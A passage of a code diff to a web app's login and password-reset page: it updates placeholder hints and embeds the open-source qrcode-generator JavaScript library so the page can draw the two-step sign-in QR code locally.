@@ -1346,7 +1346,7 @@ input.adm-th-search:not(:placeholder-shown){color:var(--text);text-transform:non
       </div>
       <div class="field" id="cs_tokenField">
         <label for="cs_token">One-time setup code (from your email/link)</label>
-        <input id="cs_token" placeholder="e.g. AB12CD34" autocomplete="off" style="text-transform:uppercase">
+        <input id="cs_token" placeholder="e.g. K7MP-Q4XR-9TWA" autocomplete="off" style="text-transform:uppercase">
       </div>
       <div class="field">
         <label for="cs_pwd1">New password</label>
@@ -1414,7 +1414,7 @@ input.adm-th-search:not(:placeholder-shown){color:var(--text);text-transform:non
         <div id="efSentNote" style="display:none;margin:0 0 14px;padding:12px 14px;border-radius:10px;background:rgba(120,200,140,.12);color:#3f9a57;font-size:13.5px;font-weight:600"></div>
         <div class="field"><label for="ef_uid2">Employee ID</label><input id="ef_uid2" autocomplete="off"></div>
         <div class="field" id="ef_codeField"><label for="ef_code">Reset code from the email</label><input id="ef_code" placeholder="e.g. K7Q2M-9XDRP" autocomplete="one-time-code" autocapitalize="characters" spellcheck="false"></div>
-        <div class="field"><label for="ef_pwd1">New password</label><input id="ef_pwd1" type="password" autocomplete="new-password" placeholder="At least 8 characters"></div>
+        <div class="field"><label for="ef_pwd1">New password</label><input id="ef_pwd1" type="password" autocomplete="new-password" placeholder="At least 10 characters"></div>
         <div class="field"><label for="ef_pwd2">Confirm new password</label><input id="ef_pwd2" type="password" autocomplete="new-password"></div>
         <button class="btn" id="efResetBtn" onclick="submitEmpReset()">Set new password</button>
         <p class="login-note" style="margin-top:12px">
@@ -1501,6 +1501,2308 @@ input.adm-th-search:not(:placeholder-shown){color:var(--text);text-transform:non
   <button type="button" onclick="dismissPingAlert()">Got it</button>
 </div>
 <script>
+/* qrcode-generator 1.4.4 (MIT licence, Copyright (c) 2009 Kazuhiko Arase) - draws the
+   two-step sign-in QR code locally, so the secret never leaves this page. */
+//---------------------------------------------------------------------
+//
+// QR Code Generator for JavaScript
+//
+// Copyright (c) 2009 Kazuhiko Arase
+//
+// URL: http://www.d-project.com/
+//
+// Licensed under the MIT license:
+//  http://www.opensource.org/licenses/mit-license.php
+//
+// The word 'QR Code' is registered trademark of
+// DENSO WAVE INCORPORATED
+//  http://www.denso-wave.com/qrcode/faqpatent-e.html
+//
+//---------------------------------------------------------------------
+
+var qrcode = function() {
+
+  //---------------------------------------------------------------------
+  // qrcode
+  //---------------------------------------------------------------------
+
+  /**
+   * qrcode
+   * @param typeNumber 1 to 40
+   * @param errorCorrectionLevel 'L','M','Q','H'
+   */
+  var qrcode = function(typeNumber, errorCorrectionLevel) {
+
+    var PAD0 = 0xEC;
+    var PAD1 = 0x11;
+
+    var _typeNumber = typeNumber;
+    var _errorCorrectionLevel = QRErrorCorrectionLevel[errorCorrectionLevel];
+    var _modules = null;
+    var _moduleCount = 0;
+    var _dataCache = null;
+    var _dataList = [];
+
+    var _this = {};
+
+    var makeImpl = function(test, maskPattern) {
+
+      _moduleCount = _typeNumber * 4 + 17;
+      _modules = function(moduleCount) {
+        var modules = new Array(moduleCount);
+        for (var row = 0; row < moduleCount; row += 1) {
+          modules[row] = new Array(moduleCount);
+          for (var col = 0; col < moduleCount; col += 1) {
+            modules[row][col] = null;
+          }
+        }
+        return modules;
+      }(_moduleCount);
+
+      setupPositionProbePattern(0, 0);
+      setupPositionProbePattern(_moduleCount - 7, 0);
+      setupPositionProbePattern(0, _moduleCount - 7);
+      setupPositionAdjustPattern();
+      setupTimingPattern();
+      setupTypeInfo(test, maskPattern);
+
+      if (_typeNumber >= 7) {
+        setupTypeNumber(test);
+      }
+
+      if (_dataCache == null) {
+        _dataCache = createData(_typeNumber, _errorCorrectionLevel, _dataList);
+      }
+
+      mapData(_dataCache, maskPattern);
+    };
+
+    var setupPositionProbePattern = function(row, col) {
+
+      for (var r = -1; r <= 7; r += 1) {
+
+        if (row + r <= -1 || _moduleCount <= row + r) continue;
+
+        for (var c = -1; c <= 7; c += 1) {
+
+          if (col + c <= -1 || _moduleCount <= col + c) continue;
+
+          if ( (0 <= r && r <= 6 && (c == 0 || c == 6) )
+              || (0 <= c && c <= 6 && (r == 0 || r == 6) )
+              || (2 <= r && r <= 4 && 2 <= c && c <= 4) ) {
+            _modules[row + r][col + c] = true;
+          } else {
+            _modules[row + r][col + c] = false;
+          }
+        }
+      }
+    };
+
+    var getBestMaskPattern = function() {
+
+      var minLostPoint = 0;
+      var pattern = 0;
+
+      for (var i = 0; i < 8; i += 1) {
+
+        makeImpl(true, i);
+
+        var lostPoint = QRUtil.getLostPoint(_this);
+
+        if (i == 0 || minLostPoint > lostPoint) {
+          minLostPoint = lostPoint;
+          pattern = i;
+        }
+      }
+
+      return pattern;
+    };
+
+    var setupTimingPattern = function() {
+
+      for (var r = 8; r < _moduleCount - 8; r += 1) {
+        if (_modules[r][6] != null) {
+          continue;
+        }
+        _modules[r][6] = (r % 2 == 0);
+      }
+
+      for (var c = 8; c < _moduleCount - 8; c += 1) {
+        if (_modules[6][c] != null) {
+          continue;
+        }
+        _modules[6][c] = (c % 2 == 0);
+      }
+    };
+
+    var setupPositionAdjustPattern = function() {
+
+      var pos = QRUtil.getPatternPosition(_typeNumber);
+
+      for (var i = 0; i < pos.length; i += 1) {
+
+        for (var j = 0; j < pos.length; j += 1) {
+
+          var row = pos[i];
+          var col = pos[j];
+
+          if (_modules[row][col] != null) {
+            continue;
+          }
+
+          for (var r = -2; r <= 2; r += 1) {
+
+            for (var c = -2; c <= 2; c += 1) {
+
+              if (r == -2 || r == 2 || c == -2 || c == 2
+                  || (r == 0 && c == 0) ) {
+                _modules[row + r][col + c] = true;
+              } else {
+                _modules[row + r][col + c] = false;
+              }
+            }
+          }
+        }
+      }
+    };
+
+    var setupTypeNumber = function(test) {
+
+      var bits = QRUtil.getBCHTypeNumber(_typeNumber);
+
+      for (var i = 0; i < 18; i += 1) {
+        var mod = (!test && ( (bits >> i) & 1) == 1);
+        _modules[Math.floor(i / 3)][i % 3 + _moduleCount - 8 - 3] = mod;
+      }
+
+      for (var i = 0; i < 18; i += 1) {
+        var mod = (!test && ( (bits >> i) & 1) == 1);
+        _modules[i % 3 + _moduleCount - 8 - 3][Math.floor(i / 3)] = mod;
+      }
+    };
+
+    var setupTypeInfo = function(test, maskPattern) {
+
+      var data = (_errorCorrectionLevel << 3) | maskPattern;
+      var bits = QRUtil.getBCHTypeInfo(data);
+
+      // vertical
+      for (var i = 0; i < 15; i += 1) {
+
+        var mod = (!test && ( (bits >> i) & 1) == 1);
+
+        if (i < 6) {
+          _modules[i][8] = mod;
+        } else if (i < 8) {
+          _modules[i + 1][8] = mod;
+        } else {
+          _modules[_moduleCount - 15 + i][8] = mod;
+        }
+      }
+
+      // horizontal
+      for (var i = 0; i < 15; i += 1) {
+
+        var mod = (!test && ( (bits >> i) & 1) == 1);
+
+        if (i < 8) {
+          _modules[8][_moduleCount - i - 1] = mod;
+        } else if (i < 9) {
+          _modules[8][15 - i - 1 + 1] = mod;
+        } else {
+          _modules[8][15 - i - 1] = mod;
+        }
+      }
+
+      // fixed module
+      _modules[_moduleCount - 8][8] = (!test);
+    };
+
+    var mapData = function(data, maskPattern) {
+
+      var inc = -1;
+      var row = _moduleCount - 1;
+      var bitIndex = 7;
+      var byteIndex = 0;
+      var maskFunc = QRUtil.getMaskFunction(maskPattern);
+
+      for (var col = _moduleCount - 1; col > 0; col -= 2) {
+
+        if (col == 6) col -= 1;
+
+        while (true) {
+
+          for (var c = 0; c < 2; c += 1) {
+
+            if (_modules[row][col - c] == null) {
+
+              var dark = false;
+
+              if (byteIndex < data.length) {
+                dark = ( ( (data[byteIndex] >>> bitIndex) & 1) == 1);
+              }
+
+              var mask = maskFunc(row, col - c);
+
+              if (mask) {
+                dark = !dark;
+              }
+
+              _modules[row][col - c] = dark;
+              bitIndex -= 1;
+
+              if (bitIndex == -1) {
+                byteIndex += 1;
+                bitIndex = 7;
+              }
+            }
+          }
+
+          row += inc;
+
+          if (row < 0 || _moduleCount <= row) {
+            row -= inc;
+            inc = -inc;
+            break;
+          }
+        }
+      }
+    };
+
+    var createBytes = function(buffer, rsBlocks) {
+
+      var offset = 0;
+
+      var maxDcCount = 0;
+      var maxEcCount = 0;
+
+      var dcdata = new Array(rsBlocks.length);
+      var ecdata = new Array(rsBlocks.length);
+
+      for (var r = 0; r < rsBlocks.length; r += 1) {
+
+        var dcCount = rsBlocks[r].dataCount;
+        var ecCount = rsBlocks[r].totalCount - dcCount;
+
+        maxDcCount = Math.max(maxDcCount, dcCount);
+        maxEcCount = Math.max(maxEcCount, ecCount);
+
+        dcdata[r] = new Array(dcCount);
+
+        for (var i = 0; i < dcdata[r].length; i += 1) {
+          dcdata[r][i] = 0xff & buffer.getBuffer()[i + offset];
+        }
+        offset += dcCount;
+
+        var rsPoly = QRUtil.getErrorCorrectPolynomial(ecCount);
+        var rawPoly = qrPolynomial(dcdata[r], rsPoly.getLength() - 1);
+
+        var modPoly = rawPoly.mod(rsPoly);
+        ecdata[r] = new Array(rsPoly.getLength() - 1);
+        for (var i = 0; i < ecdata[r].length; i += 1) {
+          var modIndex = i + modPoly.getLength() - ecdata[r].length;
+          ecdata[r][i] = (modIndex >= 0)? modPoly.getAt(modIndex) : 0;
+        }
+      }
+
+      var totalCodeCount = 0;
+      for (var i = 0; i < rsBlocks.length; i += 1) {
+        totalCodeCount += rsBlocks[i].totalCount;
+      }
+
+      var data = new Array(totalCodeCount);
+      var index = 0;
+
+      for (var i = 0; i < maxDcCount; i += 1) {
+        for (var r = 0; r < rsBlocks.length; r += 1) {
+          if (i < dcdata[r].length) {
+            data[index] = dcdata[r][i];
+            index += 1;
+          }
+        }
+      }
+
+      for (var i = 0; i < maxEcCount; i += 1) {
+        for (var r = 0; r < rsBlocks.length; r += 1) {
+          if (i < ecdata[r].length) {
+            data[index] = ecdata[r][i];
+            index += 1;
+          }
+        }
+      }
+
+      return data;
+    };
+
+    var createData = function(typeNumber, errorCorrectionLevel, dataList) {
+
+      var rsBlocks = QRRSBlock.getRSBlocks(typeNumber, errorCorrectionLevel);
+
+      var buffer = qrBitBuffer();
+
+      for (var i = 0; i < dataList.length; i += 1) {
+        var data = dataList[i];
+        buffer.put(data.getMode(), 4);
+        buffer.put(data.getLength(), QRUtil.getLengthInBits(data.getMode(), typeNumber) );
+        data.write(buffer);
+      }
+
+      // calc num max data.
+      var totalDataCount = 0;
+      for (var i = 0; i < rsBlocks.length; i += 1) {
+        totalDataCount += rsBlocks[i].dataCount;
+      }
+
+      if (buffer.getLengthInBits() > totalDataCount * 8) {
+        throw 'code length overflow. ('
+          + buffer.getLengthInBits()
+          + '>'
+          + totalDataCount * 8
+          + ')';
+      }
+
+      // end code
+      if (buffer.getLengthInBits() + 4 <= totalDataCount * 8) {
+        buffer.put(0, 4);
+      }
+
+      // padding
+      while (buffer.getLengthInBits() % 8 != 0) {
+        buffer.putBit(false);
+      }
+
+      // padding
+      while (true) {
+
+        if (buffer.getLengthInBits() >= totalDataCount * 8) {
+          break;
+        }
+        buffer.put(PAD0, 8);
+
+        if (buffer.getLengthInBits() >= totalDataCount * 8) {
+          break;
+        }
+        buffer.put(PAD1, 8);
+      }
+
+      return createBytes(buffer, rsBlocks);
+    };
+
+    _this.addData = function(data, mode) {
+
+      mode = mode || 'Byte';
+
+      var newData = null;
+
+      switch(mode) {
+      case 'Numeric' :
+        newData = qrNumber(data);
+        break;
+      case 'Alphanumeric' :
+        newData = qrAlphaNum(data);
+        break;
+      case 'Byte' :
+        newData = qr8BitByte(data);
+        break;
+      case 'Kanji' :
+        newData = qrKanji(data);
+        break;
+      default :
+        throw 'mode:' + mode;
+      }
+
+      _dataList.push(newData);
+      _dataCache = null;
+    };
+
+    _this.isDark = function(row, col) {
+      if (row < 0 || _moduleCount <= row || col < 0 || _moduleCount <= col) {
+        throw row + ',' + col;
+      }
+      return _modules[row][col];
+    };
+
+    _this.getModuleCount = function() {
+      return _moduleCount;
+    };
+
+    _this.make = function() {
+      if (_typeNumber < 1) {
+        var typeNumber = 1;
+
+        for (; typeNumber < 40; typeNumber++) {
+          var rsBlocks = QRRSBlock.getRSBlocks(typeNumber, _errorCorrectionLevel);
+          var buffer = qrBitBuffer();
+
+          for (var i = 0; i < _dataList.length; i++) {
+            var data = _dataList[i];
+            buffer.put(data.getMode(), 4);
+            buffer.put(data.getLength(), QRUtil.getLengthInBits(data.getMode(), typeNumber) );
+            data.write(buffer);
+          }
+
+          var totalDataCount = 0;
+          for (var i = 0; i < rsBlocks.length; i++) {
+            totalDataCount += rsBlocks[i].dataCount;
+          }
+
+          if (buffer.getLengthInBits() <= totalDataCount * 8) {
+            break;
+          }
+        }
+
+        _typeNumber = typeNumber;
+      }
+
+      makeImpl(false, getBestMaskPattern() );
+    };
+
+    _this.createTableTag = function(cellSize, margin) {
+
+      cellSize = cellSize || 2;
+      margin = (typeof margin == 'undefined')? cellSize * 4 : margin;
+
+      var qrHtml = '';
+
+      qrHtml += '<table style="';
+      qrHtml += ' border-width: 0px; border-style: none;';
+      qrHtml += ' border-collapse: collapse;';
+      qrHtml += ' padding: 0px; margin: ' + margin + 'px;';
+      qrHtml += '">';
+      qrHtml += '<tbody>';
+
+      for (var r = 0; r < _this.getModuleCount(); r += 1) {
+
+        qrHtml += '<tr>';
+
+        for (var c = 0; c < _this.getModuleCount(); c += 1) {
+          qrHtml += '<td style="';
+          qrHtml += ' border-width: 0px; border-style: none;';
+          qrHtml += ' border-collapse: collapse;';
+          qrHtml += ' padding: 0px; margin: 0px;';
+          qrHtml += ' width: ' + cellSize + 'px;';
+          qrHtml += ' height: ' + cellSize + 'px;';
+          qrHtml += ' background-color: ';
+          qrHtml += _this.isDark(r, c)? '#000000' : '#ffffff';
+          qrHtml += ';';
+          qrHtml += '"/>';
+        }
+
+        qrHtml += '</tr>';
+      }
+
+      qrHtml += '</tbody>';
+      qrHtml += '</table>';
+
+      return qrHtml;
+    };
+
+    _this.createSvgTag = function(cellSize, margin, alt, title) {
+
+      var opts = {};
+      if (typeof arguments[0] == 'object') {
+        // Called by options.
+        opts = arguments[0];
+        // overwrite cellSize and margin.
+        cellSize = opts.cellSize;
+        margin = opts.margin;
+        alt = opts.alt;
+        title = opts.title;
+      }
+
+      cellSize = cellSize || 2;
+      margin = (typeof margin == 'undefined')? cellSize * 4 : margin;
+
+      // Compose alt property surrogate
+      alt = (typeof alt === 'string') ? {text: alt} : alt || {};
+      alt.text = alt.text || null;
+      alt.id = (alt.text) ? alt.id || 'qrcode-description' : null;
+
+      // Compose title property surrogate
+      title = (typeof title === 'string') ? {text: title} : title || {};
+      title.text = title.text || null;
+      title.id = (title.text) ? title.id || 'qrcode-title' : null;
+
+      var size = _this.getModuleCount() * cellSize + margin * 2;
+      var c, mc, r, mr, qrSvg='', rect;
+
+      rect = 'l' + cellSize + ',0 0,' + cellSize +
+        ' -' + cellSize + ',0 0,-' + cellSize + 'z ';
+
+      qrSvg += '<svg version="1.1" xmlns="http://www.w3.org/2000/svg"';
+      qrSvg += !opts.scalable ? ' width="' + size + 'px" height="' + size + 'px"' : '';
+      qrSvg += ' viewBox="0 0 ' + size + ' ' + size + '" ';
+      qrSvg += ' preserveAspectRatio="xMinYMin meet"';
+      qrSvg += (title.text || alt.text) ? ' role="img" aria-labelledby="' +
+          escapeXml([title.id, alt.id].join(' ').trim() ) + '"' : '';
+      qrSvg += '>';
+      qrSvg += (title.text) ? '<title id="' + escapeXml(title.id) + '">' +
+          escapeXml(title.text) + '</title>' : '';
+      qrSvg += (alt.text) ? '<description id="' + escapeXml(alt.id) + '">' +
+          escapeXml(alt.text) + '</description>' : '';
+      qrSvg += '<rect width="100%" height="100%" fill="white" cx="0" cy="0"/>';
+      qrSvg += '<path d="';
+
+      for (r = 0; r < _this.getModuleCount(); r += 1) {
+        mr = r * cellSize + margin;
+        for (c = 0; c < _this.getModuleCount(); c += 1) {
+          if (_this.isDark(r, c) ) {
+            mc = c*cellSize+margin;
+            qrSvg += 'M' + mc + ',' + mr + rect;
+          }
+        }
+      }
+
+      qrSvg += '" stroke="transparent" fill="black"/>';
+      qrSvg += '</svg>';
+
+      return qrSvg;
+    };
+
+    _this.createDataURL = function(cellSize, margin) {
+
+      cellSize = cellSize || 2;
+      margin = (typeof margin == 'undefined')? cellSize * 4 : margin;
+
+      var size = _this.getModuleCount() * cellSize + margin * 2;
+      var min = margin;
+      var max = size - margin;
+
+      return createDataURL(size, size, function(x, y) {
+        if (min <= x && x < max && min <= y && y < max) {
+          var c = Math.floor( (x - min) / cellSize);
+          var r = Math.floor( (y - min) / cellSize);
+          return _this.isDark(r, c)? 0 : 1;
+        } else {
+          return 1;
+        }
+      } );
+    };
+
+    _this.createImgTag = function(cellSize, margin, alt) {
+
+      cellSize = cellSize || 2;
+      margin = (typeof margin == 'undefined')? cellSize * 4 : margin;
+
+      var size = _this.getModuleCount() * cellSize + margin * 2;
+
+      var img = '';
+      img += '<img';
+      img += '\u0020src="';
+      img += _this.createDataURL(cellSize, margin);
+      img += '"';
+      img += '\u0020width="';
+      img += size;
+      img += '"';
+      img += '\u0020height="';
+      img += size;
+      img += '"';
+      if (alt) {
+        img += '\u0020alt="';
+        img += escapeXml(alt);
+        img += '"';
+      }
+      img += '/>';
+
+      return img;
+    };
+
+    var escapeXml = function(s) {
+      var escaped = '';
+      for (var i = 0; i < s.length; i += 1) {
+        var c = s.charAt(i);
+        switch(c) {
+        case '<': escaped += '&lt;'; break;
+        case '>': escaped += '&gt;'; break;
+        case '&': escaped += '&amp;'; break;
+        case '"': escaped += '&quot;'; break;
+        default : escaped += c; break;
+        }
+      }
+      return escaped;
+    };
+
+    var _createHalfASCII = function(margin) {
+      var cellSize = 1;
+      margin = (typeof margin == 'undefined')? cellSize * 2 : margin;
+
+      var size = _this.getModuleCount() * cellSize + margin * 2;
+      var min = margin;
+      var max = size - margin;
+
+      var y, x, r1, r2, p;
+
+      var blocks = {
+        '██': '█',
+        '█ ': '▀',
+        ' █': '▄',
+        '  ': ' '
+      };
+
+      var blocksLastLineNoMargin = {
+        '██': '▀',
+        '█ ': '▀',
+        ' █': ' ',
+        '  ': ' '
+      };
+
+      var ascii = '';
+      for (y = 0; y < size; y += 2) {
+        r1 = Math.floor((y - min) / cellSize);
+        r2 = Math.floor((y + 1 - min) / cellSize);
+        for (x = 0; x < size; x += 1) {
+          p = '█';
+
+          if (min <= x && x < max && min <= y && y < max && _this.isDark(r1, Math.floor((x - min) / cellSize))) {
+            p = ' ';
+          }
+
+          if (min <= x && x < max && min <= y+1 && y+1 < max && _this.isDark(r2, Math.floor((x - min) / cellSize))) {
+            p += ' ';
+          }
+          else {
+            p += '█';
+          }
+
+          // Output 2 characters per pixel, to create full square. 1 character per pixels gives only half width of square.
+          ascii += (margin < 1 && y+1 >= max) ? blocksLastLineNoMargin[p] : blocks[p];
+        }
+
+        ascii += '\n';
+      }
+
+      if (size % 2 && margin > 0) {
+        return ascii.substring(0, ascii.length - size - 1) + Array(size+1).join('▀');
+      }
+
+      return ascii.substring(0, ascii.length-1);
+    };
+
+    _this.createASCII = function(cellSize, margin) {
+      cellSize = cellSize || 1;
+
+      if (cellSize < 2) {
+        return _createHalfASCII(margin);
+      }
+
+      cellSize -= 1;
+      margin = (typeof margin == 'undefined')? cellSize * 2 : margin;
+
+      var size = _this.getModuleCount() * cellSize + margin * 2;
+      var min = margin;
+      var max = size - margin;
+
+      var y, x, r, p;
+
+      var white = Array(cellSize+1).join('██');
+      var black = Array(cellSize+1).join('  ');
+
+      var ascii = '';
+      var line = '';
+      for (y = 0; y < size; y += 1) {
+        r = Math.floor( (y - min) / cellSize);
+        line = '';
+        for (x = 0; x < size; x += 1) {
+          p = 1;
+
+          if (min <= x && x < max && min <= y && y < max && _this.isDark(r, Math.floor((x - min) / cellSize))) {
+            p = 0;
+          }
+
+          // Output 2 characters per pixel, to create full square. 1 character per pixels gives only half width of square.
+          line += p ? white : black;
+        }
+
+        for (r = 0; r < cellSize; r += 1) {
+          ascii += line + '\n';
+        }
+      }
+
+      return ascii.substring(0, ascii.length-1);
+    };
+
+    _this.renderTo2dContext = function(context, cellSize) {
+      cellSize = cellSize || 2;
+      var length = _this.getModuleCount();
+      for (var row = 0; row < length; row++) {
+        for (var col = 0; col < length; col++) {
+          context.fillStyle = _this.isDark(row, col) ? 'black' : 'white';
+          context.fillRect(row * cellSize, col * cellSize, cellSize, cellSize);
+        }
+      }
+    }
+
+    return _this;
+  };
+
+  //---------------------------------------------------------------------
+  // qrcode.stringToBytes
+  //---------------------------------------------------------------------
+
+  qrcode.stringToBytesFuncs = {
+    'default' : function(s) {
+      var bytes = [];
+      for (var i = 0; i < s.length; i += 1) {
+        var c = s.charCodeAt(i);
+        bytes.push(c & 0xff);
+      }
+      return bytes;
+    }
+  };
+
+  qrcode.stringToBytes = qrcode.stringToBytesFuncs['default'];
+
+  //---------------------------------------------------------------------
+  // qrcode.createStringToBytes
+  //---------------------------------------------------------------------
+
+  /**
+   * @param unicodeData base64 string of byte array.
+   * [16bit Unicode],[16bit Bytes], ...
+   * @param numChars
+   */
+  qrcode.createStringToBytes = function(unicodeData, numChars) {
+
+    // create conversion map.
+
+    var unicodeMap = function() {
+
+      var bin = base64DecodeInputStream(unicodeData);
+      var read = function() {
+        var b = bin.read();
+        if (b == -1) throw 'eof';
+        return b;
+      };
+
+      var count = 0;
+      var unicodeMap = {};
+      while (true) {
+        var b0 = bin.read();
+        if (b0 == -1) break;
+        var b1 = read();
+        var b2 = read();
+        var b3 = read();
+        var k = String.fromCharCode( (b0 << 8) | b1);
+        var v = (b2 << 8) | b3;
+        unicodeMap[k] = v;
+        count += 1;
+      }
+      if (count != numChars) {
+        throw count + ' != ' + numChars;
+      }
+
+      return unicodeMap;
+    }();
+
+    var unknownChar = '?'.charCodeAt(0);
+
+    return function(s) {
+      var bytes = [];
+      for (var i = 0; i < s.length; i += 1) {
+        var c = s.charCodeAt(i);
+        if (c < 128) {
+          bytes.push(c);
+        } else {
+          var b = unicodeMap[s.charAt(i)];
+          if (typeof b == 'number') {
+            if ( (b & 0xff) == b) {
+              // 1byte
+              bytes.push(b);
+            } else {
+              // 2bytes
+              bytes.push(b >>> 8);
+              bytes.push(b & 0xff);
+            }
+          } else {
+            bytes.push(unknownChar);
+          }
+        }
+      }
+      return bytes;
+    };
+  };
+
+  //---------------------------------------------------------------------
+  // QRMode
+  //---------------------------------------------------------------------
+
+  var QRMode = {
+    MODE_NUMBER :    1 << 0,
+    MODE_ALPHA_NUM : 1 << 1,
+    MODE_8BIT_BYTE : 1 << 2,
+    MODE_KANJI :     1 << 3
+  };
+
+  //---------------------------------------------------------------------
+  // QRErrorCorrectionLevel
+  //---------------------------------------------------------------------
+
+  var QRErrorCorrectionLevel = {
+    L : 1,
+    M : 0,
+    Q : 3,
+    H : 2
+  };
+
+  //---------------------------------------------------------------------
+  // QRMaskPattern
+  //---------------------------------------------------------------------
+
+  var QRMaskPattern = {
+    PATTERN000 : 0,
+    PATTERN001 : 1,
+    PATTERN010 : 2,
+    PATTERN011 : 3,
+    PATTERN100 : 4,
+    PATTERN101 : 5,
+    PATTERN110 : 6,
+    PATTERN111 : 7
+  };
+
+  //---------------------------------------------------------------------
+  // QRUtil
+  //---------------------------------------------------------------------
+
+  var QRUtil = function() {
+
+    var PATTERN_POSITION_TABLE = [
+      [],
+      [6, 18],
+      [6, 22],
+      [6, 26],
+      [6, 30],
+      [6, 34],
+      [6, 22, 38],
+      [6, 24, 42],
+      [6, 26, 46],
+      [6, 28, 50],
+      [6, 30, 54],
+      [6, 32, 58],
+      [6, 34, 62],
+      [6, 26, 46, 66],
+      [6, 26, 48, 70],
+      [6, 26, 50, 74],
+      [6, 30, 54, 78],
+      [6, 30, 56, 82],
+      [6, 30, 58, 86],
+      [6, 34, 62, 90],
+      [6, 28, 50, 72, 94],
+      [6, 26, 50, 74, 98],
+      [6, 30, 54, 78, 102],
+      [6, 28, 54, 80, 106],
+      [6, 32, 58, 84, 110],
+      [6, 30, 58, 86, 114],
+      [6, 34, 62, 90, 118],
+      [6, 26, 50, 74, 98, 122],
+      [6, 30, 54, 78, 102, 126],
+      [6, 26, 52, 78, 104, 130],
+      [6, 30, 56, 82, 108, 134],
+      [6, 34, 60, 86, 112, 138],
+      [6, 30, 58, 86, 114, 142],
+      [6, 34, 62, 90, 118, 146],
+      [6, 30, 54, 78, 102, 126, 150],
+      [6, 24, 50, 76, 102, 128, 154],
+      [6, 28, 54, 80, 106, 132, 158],
+      [6, 32, 58, 84, 110, 136, 162],
+      [6, 26, 54, 82, 110, 138, 166],
+      [6, 30, 58, 86, 114, 142, 170]
+    ];
+    var G15 = (1 << 10) | (1 << 8) | (1 << 5) | (1 << 4) | (1 << 2) | (1 << 1) | (1 << 0);
+    var G18 = (1 << 12) | (1 << 11) | (1 << 10) | (1 << 9) | (1 << 8) | (1 << 5) | (1 << 2) | (1 << 0);
+    var G15_MASK = (1 << 14) | (1 << 12) | (1 << 10) | (1 << 4) | (1 << 1);
+
+    var _this = {};
+
+    var getBCHDigit = function(data) {
+      var digit = 0;
+      while (data != 0) {
+        digit += 1;
+        data >>>= 1;
+      }
+      return digit;
+    };
+
+    _this.getBCHTypeInfo = function(data) {
+      var d = data << 10;
+      while (getBCHDigit(d) - getBCHDigit(G15) >= 0) {
+        d ^= (G15 << (getBCHDigit(d) - getBCHDigit(G15) ) );
+      }
+      return ( (data << 10) | d) ^ G15_MASK;
+    };
+
+    _this.getBCHTypeNumber = function(data) {
+      var d = data << 12;
+      while (getBCHDigit(d) - getBCHDigit(G18) >= 0) {
+        d ^= (G18 << (getBCHDigit(d) - getBCHDigit(G18) ) );
+      }
+      return (data << 12) | d;
+    };
+
+    _this.getPatternPosition = function(typeNumber) {
+      return PATTERN_POSITION_TABLE[typeNumber - 1];
+    };
+
+    _this.getMaskFunction = function(maskPattern) {
+
+      switch (maskPattern) {
+
+      case QRMaskPattern.PATTERN000 :
+        return function(i, j) { return (i + j) % 2 == 0; };
+      case QRMaskPattern.PATTERN001 :
+        return function(i, j) { return i % 2 == 0; };
+      case QRMaskPattern.PATTERN010 :
+        return function(i, j) { return j % 3 == 0; };
+      case QRMaskPattern.PATTERN011 :
+        return function(i, j) { return (i + j) % 3 == 0; };
+      case QRMaskPattern.PATTERN100 :
+        return function(i, j) { return (Math.floor(i / 2) + Math.floor(j / 3) ) % 2 == 0; };
+      case QRMaskPattern.PATTERN101 :
+        return function(i, j) { return (i * j) % 2 + (i * j) % 3 == 0; };
+      case QRMaskPattern.PATTERN110 :
+        return function(i, j) { return ( (i * j) % 2 + (i * j) % 3) % 2 == 0; };
+      case QRMaskPattern.PATTERN111 :
+        return function(i, j) { return ( (i * j) % 3 + (i + j) % 2) % 2 == 0; };
+
+      default :
+        throw 'bad maskPattern:' + maskPattern;
+      }
+    };
+
+    _this.getErrorCorrectPolynomial = function(errorCorrectLength) {
+      var a = qrPolynomial([1], 0);
+      for (var i = 0; i < errorCorrectLength; i += 1) {
+        a = a.multiply(qrPolynomial([1, QRMath.gexp(i)], 0) );
+      }
+      return a;
+    };
+
+    _this.getLengthInBits = function(mode, type) {
+
+      if (1 <= type && type < 10) {
+
+        // 1 - 9
+
+        switch(mode) {
+        case QRMode.MODE_NUMBER    : return 10;
+        case QRMode.MODE_ALPHA_NUM : return 9;
+        case QRMode.MODE_8BIT_BYTE : return 8;
+        case QRMode.MODE_KANJI     : return 8;
+        default :
+          throw 'mode:' + mode;
+        }
+
+      } else if (type < 27) {
+
+        // 10 - 26
+
+        switch(mode) {
+        case QRMode.MODE_NUMBER    : return 12;
+        case QRMode.MODE_ALPHA_NUM : return 11;
+        case QRMode.MODE_8BIT_BYTE : return 16;
+        case QRMode.MODE_KANJI     : return 10;
+        default :
+          throw 'mode:' + mode;
+        }
+
+      } else if (type < 41) {
+
+        // 27 - 40
+
+        switch(mode) {
+        case QRMode.MODE_NUMBER    : return 14;
+        case QRMode.MODE_ALPHA_NUM : return 13;
+        case QRMode.MODE_8BIT_BYTE : return 16;
+        case QRMode.MODE_KANJI     : return 12;
+        default :
+          throw 'mode:' + mode;
+        }
+
+      } else {
+        throw 'type:' + type;
+      }
+    };
+
+    _this.getLostPoint = function(qrcode) {
+
+      var moduleCount = qrcode.getModuleCount();
+
+      var lostPoint = 0;
+
+      // LEVEL1
+
+      for (var row = 0; row < moduleCount; row += 1) {
+        for (var col = 0; col < moduleCount; col += 1) {
+
+          var sameCount = 0;
+          var dark = qrcode.isDark(row, col);
+
+          for (var r = -1; r <= 1; r += 1) {
+
+            if (row + r < 0 || moduleCount <= row + r) {
+              continue;
+            }
+
+            for (var c = -1; c <= 1; c += 1) {
+
+              if (col + c < 0 || moduleCount <= col + c) {
+                continue;
+              }
+
+              if (r == 0 && c == 0) {
+                continue;
+              }
+
+              if (dark == qrcode.isDark(row + r, col + c) ) {
+                sameCount += 1;
+              }
+            }
+          }
+
+          if (sameCount > 5) {
+            lostPoint += (3 + sameCount - 5);
+          }
+        }
+      };
+
+      // LEVEL2
+
+      for (var row = 0; row < moduleCount - 1; row += 1) {
+        for (var col = 0; col < moduleCount - 1; col += 1) {
+          var count = 0;
+          if (qrcode.isDark(row, col) ) count += 1;
+          if (qrcode.isDark(row + 1, col) ) count += 1;
+          if (qrcode.isDark(row, col + 1) ) count += 1;
+          if (qrcode.isDark(row + 1, col + 1) ) count += 1;
+          if (count == 0 || count == 4) {
+            lostPoint += 3;
+          }
+        }
+      }
+
+      // LEVEL3
+
+      for (var row = 0; row < moduleCount; row += 1) {
+        for (var col = 0; col < moduleCount - 6; col += 1) {
+          if (qrcode.isDark(row, col)
+              && !qrcode.isDark(row, col + 1)
